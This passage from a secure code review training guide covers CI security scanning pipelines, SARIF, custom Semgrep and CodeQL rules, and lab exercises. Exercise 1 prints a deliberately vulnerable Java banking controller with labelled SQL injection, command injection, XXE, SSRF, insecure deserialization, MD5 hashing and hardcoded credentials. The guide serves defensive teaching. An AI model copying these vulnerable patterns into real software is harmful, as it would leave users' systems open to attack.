  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-added-large-files
        args: ['--maxkb=500']
      - id: check-merge-conflict
      - id: detect-private-key
      - id: check-json
      - id: check-yaml

  - repo: https://github.com/zricethezav/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks

  - repo: https://github.com/PyCQA/bandit
    rev: '1.7.7'
    hooks:
      - id: bandit
        args: ['-c', 'pyproject.toml', '-r', 'src/']
        additional_dependencies: ['bandit[toml]']
```

**detect-secrets baseline management:**

```bash
# Initialize baseline (marks existing secrets as "known")
detect-secrets scan > .secrets.baseline

# Audit baseline (human review of flagged items)
detect-secrets audit .secrets.baseline

# Update baseline after adding legitimate test constants
detect-secrets scan --baseline .secrets.baseline
```

### 9.2 GitHub Actions SAST Pipeline Configuration

```yaml
# .github/workflows/security.yml
name: Security Analysis
on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Weekly full scan

permissions:
  contents: read
  security-events: write
  pull-requests: write

jobs:
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep:latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Semgrep
        run: |
          semgrep scan \
            --config=p/default \
            --config=p/owasp-top-ten \
            --config=p/r2c-security-audit \
            --config=.semgrep/ \
            --sarif --output=semgrep.sarif \
            --exclude='*_test.*' \
            --exclude='test/**' \
            --metrics=off
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep.sarif
        if: always()

  codeql:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        language: [java, javascript, python]
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: +security-extended,security-and-quality
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3
        with:
          category: "/language:${{ matrix.language }}"

  dependency-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          severity: 'CRITICAL,HIGH'
          format: 'sarif'
          output: 'trivy-results.sarif'
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-results.sarif

  secrets-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: gitleaks/gitleaks-action@v2
        env:
          GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}
```

**GitLab CI equivalent:**

```yaml
# .gitlab-ci.yml
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml

sast:
  stage: test
  variables:
    SAST_EXCLUDED_ANALYZERS: "eslint"  # Use custom semgrep instead
    SEARCH_MAX_DEPTH: 10

semgrep-custom:
  stage: test
  image: semgrep/semgrep:latest
  script:
    - semgrep scan --config=auto --config=.semgrep/ --sarif -o gl-sast-report.json
  artifacts:
    reports:
      sast: gl-sast-report.json
    when: always
```

### 9.3 Pull Request Gating on Security Findings

**Strategy: Block on Critical/High, warn on Medium:**

```yaml
# Branch protection rule enforcement (via GitHub Actions)
- name: Evaluate security findings
  run: |
    CRITICAL=$(cat semgrep.sarif | jq '[.runs[].results[] | select(.level == "error")] | length')
    HIGH=$(cat semgrep.sarif | jq '[.runs[].results[] | select(.level == "warning" and .properties.tags[] == "security")] | length')

    if [ "$CRITICAL" -gt 0 ]; then
      echo "::error::$CRITICAL critical security findings detected. PR blocked."
      exit 1
    fi

    if [ "$HIGH" -gt 0 ]; then
      echo "::warning::$HIGH high-severity findings. Review recommended before merge."
    fi
```

**PR comment with findings summary:**

```yaml
- name: Comment on PR with findings
  if: github.event_name == 'pull_request' && always()
  uses: actions/github-script@v7
  with:
    script: |
      const fs = require('fs');
      const sarif = JSON.parse(fs.readFileSync('semgrep.sarif', 'utf8'));
      const results = sarif.runs.flatMap(r => r.results || []);

      if (results.length === 0) return;

      let body = '## Security Scan Results\n\n';
      body += `| Severity | Count |\n|----------|-------|\n`;
      const counts = {error: 0, warning: 0, note: 0};
      results.forEach(r => counts[r.level]++);
      body += `| Critical | ${counts.error} |\n`;
      body += `| High | ${counts.warning} |\n`;
      body += `| Info | ${counts.note} |\n\n`;

      results.slice(0, 10).forEach(r => {
        const loc = r.locations?.[0]?.physicalLocation;
        const file = loc?.artifactLocation?.uri || 'unknown';
        const line = loc?.region?.startLine || '?';
        body += `- **${r.level}**: ${r.message.text} (${file}:${line})\n`;
      });

      github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        body: body
      });
```

### 9.4 Incremental Scanning

**Scan only changed files (reducing scan time from minutes to seconds):**

```yaml
- name: Get changed files
  id: changed
  run: |
    if [ "${{ github.event_name }}" = "pull_request" ]; then
      FILES=$(git diff --name-only origin/${{ github.base_ref }}...HEAD | grep -E '\.(py|js|ts|java|go)$' | tr '\n' ' ')
    else
      FILES=$(git diff --name-only HEAD~1 | grep -E '\.(py|js|ts|java|go)$' | tr '\n' ' ')
    fi
    echo "files=$FILES" >> $GITHUB_OUTPUT

- name: Incremental Semgrep scan
  if: steps.changed.outputs.files != ''
  run: |
    semgrep scan \
      --config=auto \
      --config=.semgrep/ \
      ${{ steps.changed.outputs.files }}
```

**Baseline diffing (Semgrep native):**

```bash
# Only report findings introduced in this PR (not pre-existing issues)
semgrep scan \
  --config=auto \
  --baseline-commit=$(git merge-base HEAD origin/main) \
  --sarif -o new-findings.sarif
```

### 9.5 SARIF Format and GitHub Advanced Security

SARIF (Static Analysis Results Interchange Format) is the standard for tool-agnostic security findings:

```json
{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [{
    "tool": {
      "driver": {
        "name": "CustomScanner",
        "version": "1.0.0",
        "rules": [{
          "id": "CUSTOM-001",
          "name": "HardcodedSecret",
          "shortDescription": {"text": "Hardcoded secret detected"},
          "defaultConfiguration": {"level": "error"},
          "properties": {
            "tags": ["security", "external/cwe/cwe-798"],
            "security-severity": "9.0"
          }
        }]
      }
    },
    "results": [{
      "ruleId": "CUSTOM-001",
      "level": "error",
      "message": {"text": "Hardcoded API key found in source code"},
      "locations": [{
        "physicalLocation": {
          "artifactLocation": {"uri": "src/config.py"},
          "region": {"startLine": 42, "startColumn": 5}
        }
      }]
    }]
  }]
}
```

**GitHub Code Scanning integration:**

```yaml
# Upload SARIF to enable:
# - Alerts in Security tab
# - Inline annotations on PRs
# - Auto-dismiss when fixed
# - Severity filtering
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
    category: custom-scanner  # Groups findings by tool
```

### 9.6 Developer Feedback Loop Optimization

**Principles for adoption:**

1. **Speed:** Scan must complete in <5 minutes for PR checks. Developers abandon slow gates.
2. **Relevance:** Only flag real issues. False positives above 20% cause tool abandonment.
3. **Actionability:** Every finding must include:
   - What's wrong (in plain language)
   - Where exactly (file, line, column)
   - How to fix (code suggestion or reference)
   - Why it matters (CWE, attack scenario in one sentence)
4. **Progressive disclosure:** Show critical findings immediately, allow expanding to see all.
5. **Self-service suppression:** Let developers mark false positives with inline comments (auditable).

**IDE integration for shift-left:**

```json
// .vscode/settings.json — Semgrep in editor
{
  "semgrep.scan.configuration": [
    "p/default",
    ".semgrep/"
  ],
  "semgrep.scan.onSave": true,
  "semgrep.scan.exclude": ["**/test/**", "**/node_modules/**"]
}
```

**Metrics to track:**

| Metric | Target | Signal |
|--------|--------|--------|
| Mean time to triage | <1 day | Team responsiveness |
| False positive rate | <20% | Rule tuning needed |
| Findings per PR | <5 | Developer experience |
| Scan duration | <5 min | Pipeline efficiency |
| Fix rate within SLA | >90% | Process effectiveness |
| Reopened findings | <5% | Fix quality |

---

## 10. Lab Exercises

### Exercise 1: Review a Deliberately Vulnerable Java Application

**Objective:** Identify 10+ security vulnerabilities through manual code review.

**Target Application: VulnBank (Intentionally Vulnerable Spring Boot Banking App)**

```java
// AccountController.java — Contains multiple vulnerabilities
@RestController
@RequestMapping("/api/accounts")
public class AccountController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    // VULN 1: SQL Injection — string concatenation in query
    @GetMapping("/search")
    public List<Map<String, Object>> searchAccounts(@RequestParam String name) {
        String sql = "SELECT * FROM accounts WHERE owner_name LIKE '%" + name + "%'";
        return jdbcTemplate.queryForList(sql);
    }

    // VULN 2: IDOR — no authorization check, sequential IDs
    @GetMapping("/{id}")
    public Account getAccount(@PathVariable Long id) {
        return accountRepository.findById(id)
            .orElseThrow(() -> new NotFoundException("Account not found"));
    }

    // VULN 3: Mass assignment — user can set any field including balance
    @PostMapping("/update")
    public Account updateAccount(@RequestBody Account accountData) {
        return accountRepository.save(accountData);
    }

    // VULN 4: XSS — reflected input without encoding
    @GetMapping("/receipt")
    public String getReceipt(@RequestParam String merchant) {
        return "<html><body><h1>Payment to: " + merchant + "</h1></body></html>";
    }

    // VULN 5: Insecure deserialization — accepts serialized Java objects
    @PostMapping("/import")
    public String importData(@RequestBody byte[] data) {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        TransferRequest req = (TransferRequest) ois.readObject();
        return processTransfer(req);
    }

    // VULN 6: Command injection via PDF generation
    @GetMapping("/statement/{id}/pdf")
    public byte[] generateStatement(@PathVariable Long id,
                                     @RequestParam String format) {
        Runtime.getRuntime().exec("wkhtmltopdf --" + format + " /tmp/stmt.html /tmp/stmt.pdf");
        return Files.readAllBytes(Path.of("/tmp/stmt.pdf"));
    }

    // VULN 7: Race condition in transfer (TOCTOU)
    @PostMapping("/transfer")
    public TransferResult transfer(@RequestBody TransferRequest req) {
        Account sender = accountRepository.findById(req.getSenderId()).get();
        if (sender.getBalance() >= req.getAmount()) {
            sender.setBalance(sender.getBalance() - req.getAmount());
            Account receiver = accountRepository.findById(req.getReceiverId()).get();
            receiver.setBalance(receiver.getBalance() + req.getAmount());
            accountRepository.save(sender);
            accountRepository.save(receiver);
        }
        return new TransferResult("Success");
    }

    // VULN 8: Information disclosure — stack trace and internal details
    @ExceptionHandler(Exception.class)
    public ResponseEntity<Map<String, Object>> handleError(Exception e) {
        Map<String, Object> error = new HashMap<>();
        error.put("message", e.getMessage());
        error.put("trace", Arrays.toString(e.getStackTrace()));
        error.put("cause", e.getCause() != null ? e.getCause().toString() : null);
        return ResponseEntity.status(500).body(error);
    }

    // VULN 9: Weak password hashing
    @PostMapping("/register")
    public Account register(@RequestBody RegistrationRequest req) {
        Account account = new Account();
        account.setPasswordHash(
            MessageDigest.getInstance("MD5").digest(req.getPassword().getBytes())
        );
        return accountRepository.save(account);
    }

    // VULN 10: XXE in XML import
    @PostMapping(value = "/import-xml", consumes = "application/xml")
    public String importXml(@RequestBody String xmlData) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new InputSource(new StringReader(xmlData)));
        return processXmlImport(doc);
    }

    // VULN 11: SSRF — user-controlled URL fetch
    @GetMapping("/verify-merchant")
    public String verifyMerchant(@RequestParam String url) {
        RestTemplate restTemplate = new RestTemplate();
        return restTemplate.getForObject(url, String.class);
    }

    // VULN 12: Hardcoded credentials
    private static final String ADMIN_API_KEY = "sk_live_4eC39HqLyjWDarjtT1zdp7dc";
    private static final String DB_PASSWORD = "production_db_pass_2024!";
}
```

**Exercise deliverables:**
1. Document each vulnerability with CWE ID and CVSS score
2. Provide a fixed version for each vulnerable code block
3. Write a Semgrep rule to detect at least 3 of these patterns
4. Rank findings by exploitability and impact

---

### Exercise 2: Write 5 Custom Semgrep Rules

**Objective:** Create project-specific Semgrep rules for patterns common in your codebase.

**Rule 1: Detect unparameterized JdbcTemplate queries:**

```yaml
# .semgrep/rules/jdbc-injection.yaml
rules:
  - id: jdbc-template-sql-injection
    patterns:
      - pattern: |
          $JDBC.queryForList($QUERY + ...)
      - pattern-not: |
          $JDBC.queryForList("...", ...)
    message: |
      SQL injection via string concatenation in JdbcTemplate query.
      Use parameterized queries: jdbcTemplate.queryForList(sql, params)
    severity: ERROR
    languages: [java]
    metadata:
      cwe: CWE-89
      owasp: A03:2021
      fix: Use '?' placeholders with parameter array
```

**Rule 2: Detect Flask endpoints missing authentication decorator:**

```yaml
rules:
  - id: flask-endpoint-missing-auth
    patterns:
      - pattern: |
          @app.route(...)
          def $FUNC(...):
              ...
      - pattern-not: |
          @app.route(...)
          @login_required
          def $FUNC(...):
              ...
      - pattern-not: |
          @app.route(...)
          @public_endpoint
          def $FUNC(...):
              ...
      - metavariable-regex:
          metavariable: $FUNC
          regex: '^(?!health|ready|alive|metrics|static).*$'
    message: |
      Flask endpoint '$FUNC' has no authentication decorator.
      Add @login_required or explicitly mark as @public_endpoint.
    severity: WARNING
    languages: [python]
    metadata:
      cwe: CWE-306
```

**Rule 3: Detect insecure random for security purposes:**

```yaml
rules:
  - id: insecure-random-security-context
    patterns:
      - pattern-either:
          - pattern: random.choice(...)
          - pattern: random.randint(...)
          - pattern: random.choices(...)
      - pattern-inside: |
          def $FUNC(...):
              ...
      - metavariable-regex:
          metavariable: $FUNC
          regex: '.*(token|session|secret|key|nonce|salt|otp|code|password|csrf).*'
    message: |
      Using `random` module in security-sensitive function '$FUNC'.
      Use `secrets` module instead for cryptographically secure random values.
    severity: ERROR
    languages: [python]
    metadata:
      cwe: CWE-330
```

**Rule 4: Detect Express.js response without security headers:**

```yaml
rules:
  - id: express-missing-security-headers
    patterns:
      - pattern: |
          app.use(cors($OPTS))
      - pattern-not-inside: |
          ...
          app.use(helmet(...))
          ...
    message: |
      CORS middleware is configured without helmet() security headers.
      Add helmet() middleware before CORS to set security headers
      (X-Content-Type-Options, X-Frame-Options, CSP, etc.)
    severity: WARNING
    languages: [javascript, typescript]
    metadata:
      cwe: CWE-693
```

**Rule 5: Detect sensitive data in Go struct tags (JSON exposure):**

```yaml
rules:
  - id: go-sensitive-field-json-exposed
    patterns:
      - pattern: |
          type $TYPE struct {
              ...
              $FIELD $FTYPE `json:"$TAG"`
              ...
          }
      - metavariable-regex:
          metavariable: $FIELD
          regex: '(?i)(Password|Secret|Token|ApiKey|PrivateKey|SSN|CreditCard)'
      - metavariable-regex:
          metavariable: $TAG
          regex: '^(?!-).*$'  # Not json:"-" (which means hidden)
    message: |
      Sensitive field '$FIELD' is exposed via JSON serialization.
      Use `json:"-"` tag to exclude from serialization, or ensure
      this struct is never directly marshaled to external responses.
    severity: ERROR
    languages: [go]
    metadata:
      cwe: CWE-200
```

---

### Exercise 3: Build a CodeQL Query for Taint Tracking Custom Sinks

**Objective:** Write a CodeQL query that tracks user input to custom application-specific sinks.

**Scenario:** Your application has a custom template engine and audit logger. You need to detect when user input reaches these custom sinks without sanitization.

```ql
/**
 * @name Taint flow to custom template engine
 * @description User input flows to custom template rendering without sanitization
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.0
 * @precision high
 * @id java/custom-template-injection
 * @tags security
 *       custom
 */

import java
import semmle.code.java.dataflow.TaintTracking
import semmle.code.java.dataflow.FlowSources
import DataFlow::PathGraph

/**
 * Configuration for tracking taint from remote sources to custom template sinks.
 */
class CustomTemplateInjection extends TaintTracking::Configuration {
  CustomTemplateInjection() { this = "CustomTemplateInjection" }

  override predicate isSource(DataFlow::Node source) {
    source instanceof RemoteFlowSource
  }

  override predicate isSink(DataFlow::Node sink) {
    exists(MethodAccess ma |
      // Custom template engine methods
      (
        ma.getMethod().getDeclaringType().hasQualifiedName("com.company.template", "TemplateEngine") and
        ma.getMethod().hasName("render")
      )
      or
      // Custom report generator
      (
        ma.getMethod().getDeclaringType().hasQualifiedName("com.company.reports", "ReportBuilder") and
        ma.getMethod().hasName("fromExpression")
      )
      or
      // Custom rule engine evaluation
      (
        ma.getMethod().getDeclaringType().hasQualifiedName("com.company.rules", "RuleEngine") and
        ma.getMethod().hasName("evaluate")
      )
    |
      sink.asExpr() = ma.getArgument(0)
    )
  }

  override predicate isSanitizer(DataFlow::Node sanitizer) {
    exists(MethodAccess ma |
      // Company's approved sanitization methods
      (
        ma.getMethod().getDeclaringType().hasQualifiedName("com.company.security", "InputSanitizer") and
        ma.getMethod().hasName("sanitizeTemplate")
      )
      or
      // OWASP encoder
      (
        ma.getMethod().getDeclaringType().hasQualifiedName("org.owasp.encoder", "Encode") and
        ma.getMethod().getName().matches("for%")
      )
    |
      sanitizer.asExpr() = ma
    )
  }

  override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) {
    // Track through StringBuilder append operations
    exists(MethodAccess ma |
      ma.getMethod().hasName("append") and
      ma.getMethod().getDeclaringType().hasQualifiedName("java.lang", "StringBuilder") and
      pred.asExpr() = ma.getArgument(0) and
      succ.asExpr() = ma
    )
    or
    // Track through String.format
    exists(MethodAccess ma |
      ma.getMethod().hasName("format") and
      ma.getMethod().getDeclaringType().hasQualifiedName("java.lang", "String") and
      pred.asExpr() = ma.getAnArgument() and
      succ.asExpr() = ma
    )
  }
}

from CustomTemplateInjection cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink,
  "User-controlled input from $@ flows to custom template engine without sanitization.",
  source.getNode(), "user input"
```

**Testing the query:**

```java
// Test case: should be detected (true positive)
@GetMapping("/report")
public String generateReport(@RequestParam String expression, HttpServletRequest req) {
    TemplateEngine engine = new TemplateEngine();
    return engine.render(expression);  // ALERT: direct user input to template
}

// Test case: should NOT be detected (true negative — sanitized)
@GetMapping("/report-safe")
public String generateReportSafe(@RequestParam String expression) {
    String safe = InputSanitizer.sanitizeTemplate(expression);
    TemplateEngine engine = new TemplateEngine();
    return engine.render(safe);  // No alert: sanitized
}

// Test case: should be detected (taint through StringBuilder)
@PostMapping("/complex-report")
public String complexReport(@RequestBody ReportRequest req) {
    StringBuilder template = new StringBuilder("SELECT ");
    template.append(req.getColumns());  // Taint propagates through append
    RuleEngine engine = new RuleEngine();
    return engine.evaluate(template.toString());  // ALERT: tainted input
}
```

---

### Exercise 4: Set Up a Complete CI/CD Security Scanning Pipeline

**Objective:** Configure a multi-tool security scanning pipeline that covers SAST, SCA, secrets detection, and container scanning.

**Complete pipeline configuration:**

```yaml
# .github/workflows/security-pipeline.yml
name: Security Pipeline
on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main]
  schedule:
    - cron: '0 3 * * 1'  # Full weekly scan Monday 03:00 UTC

permissions:
  contents: read
  security-events: write
  pull-requests: write
  actions: read

env:
  SEMGREP_RULES: >-
    p/default
    p/owasp-top-ten
    p/r2c-security-audit
    .semgrep/

jobs:
  # Stage 1: Fast checks (< 2 minutes)
  secrets-detection:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Gitleaks scan
        uses: gitleaks/gitleaks-action@v2
        with:
          args: --verbose --redact
      - name: TruffleHog deep scan
        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
        run: |
          docker run --rm -v $(pwd):/repo \
            trufflesecurity/trufflehog:latest \
            filesystem /repo --json > trufflehog-results.json

  # Stage 2: SAST (< 5 minutes)
  sast-semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep:latest
    steps:
      - uses: actions/checkout@v4
      - name: Determine scan scope
        id: scope
        run: |
          if [ "${{ github.event_name }}" = "pull_request" ]; then
            echo "baseline=--baseline-commit=${{ github.event.pull_request.base.sha }}" >> $GITHUB_OUTPUT
          fi
      - name: Semgrep scan
        run: |
          semgrep scan \
            --config="${SEMGREP_RULES}" \
            ${{ steps.scope.outputs.baseline }} \
            --sarif -o semgrep.sarif \
            --max-target-bytes=1000000 \
            --timeout=300 \
            --metrics=off
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep.sarif
          category: semgrep
        if: always()
      - name: Fail on critical findings
        if: always()
        run: |
          CRITICAL=$(cat semgrep.sarif | python3 -c "
          import sys, json
          sarif = json.load(sys.stdin)
          results = [r for run in sarif.get('runs',[]) for r in run.get('results',[]) if r.get('level')=='error']
          print(len(results))
          ")
          if [ "$CRITICAL" -gt 0 ]; then
            echo "::error::$CRITICAL critical SAST findings. Blocking merge."
            exit 1
          fi

  sast-codeql:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        language: [javascript, python]
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: +security-extended
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3

  # Stage 3: Dependency scanning (< 3 minutes)
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Trivy filesystem scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          scan-ref: .
          severity: CRITICAL,HIGH
          format: sarif
          output: trivy-fs.sarif
          exit-code: 1
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-fs.sarif
          category: trivy-deps
        if: always()

  # Stage 4: Container scanning (only on main push)
  container-scan:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: [sast-semgrep, dependency-scan]
    steps:
      - uses: actions/checkout@v4
      - name: Build container image
        run: docker build -t app:${{ github.sha }} .
      - name: Trivy container scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: app:${{ github.sha }}
          severity: CRITICAL,HIGH
          format: sarif
          output: trivy-image.sarif
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-image.sarif
          category: trivy-container

  # Stage 5: Security gate (aggregates all results)
  security-gate:
    runs-on: ubuntu-latest
    needs: [secrets-detection, sast-semgrep, dependency-scan]
    if: always()
    steps:
      - name: Evaluate pipeline results
        run: |
          echo "## Security Pipeline Summary" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY

          SECRETS="${{ needs.secrets-detection.result }}"
          SAST="${{ needs.sast-semgrep.result }}"
          DEPS="${{ needs.dependency-scan.result }}"

          echo "| Check | Result |" >> $GITHUB_STEP_SUMMARY
          echo "|-------|--------|" >> $GITHUB_STEP_SUMMARY
          echo "| Secrets Detection | $SECRETS |" >> $GITHUB_STEP_SUMMARY
          echo "| SAST (Semgrep) | $SAST |" >> $GITHUB_STEP_SUMMARY
          echo "| Dependency Scan | $DEPS |" >> $GITHUB_STEP_SUMMARY

          if [ "$SECRETS" = "failure" ] || [ "$SAST" = "failure" ]; then
            echo "" >> $GITHUB_STEP_SUMMARY
            echo "**BLOCKED: Critical security findings detected.**" >> $GITHUB_STEP_SUMMARY
            exit 1
          fi
```

**Local development setup (mirrors CI):**

```bash
#!/usr/bin/env bash
# scripts/security-check.sh — Run locally before pushing

set -euo pipefail

echo "=== Pre-push Security Checks ==="

echo "[1/4] Secret detection..."
gitleaks detect --source=. --verbose 2>&1 | tail -5

echo "[2/4] SAST scan (changed files only)..."
CHANGED=$(git diff --name-only origin/main...HEAD | grep -E '\.(py|js|ts|java|go)$' || true)
if [ -n "$CHANGED" ]; then
  semgrep scan --config=auto --config=.semgrep/ $CHANGED
else
  echo "No source files changed."
fi

echo "[3/4] Dependency audit..."
if [ -f "package.json" ]; then npm audit --production --audit-level=high; fi
if [ -f "requirements.txt" ]; then pip-audit -r requirements.txt --strict; fi
if [ -f "go.sum" ]; then govulncheck ./...; fi

echo "[4/4] License check..."
if [ -f "package.json" ]; then npx license-checker --production --failOn 'GPL-3.0;AGPL-3.0'; fi

echo "=== All security checks passed ==="
```

**Exercise deliverables:**
1. Configure the complete pipeline for a sample repository
2. Introduce 3 deliberate vulnerabilities and verify detection
3. Configure PR blocking rules and test the security gate
4. Set up a weekly full-scan schedule with notification to a security channel
5. Document the false-positive suppression workflow for developers
6. Measure baseline scan time and optimize for <5 minute PR checks

---

## References

- OWASP Code Review Guide v2.0 — https://owasp.org/www-project-code-review-guide/
- OWASP Testing Guide v4.2 — https://owasp.org/www-project-web-security-testing-guide/
- Semgrep Documentation — https://semgrep.dev/docs/
- CodeQL Documentation — https://codeql.github.com/docs/
- CWE (Common Weakness Enumeration) — https://cwe.mitre.org/
- NIST SP 800-218 (SSDF) — Secure Software Development Framework
- SARIF Specification — https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html
- OWASP ASVS (Application Security Verification Standard) v4.0
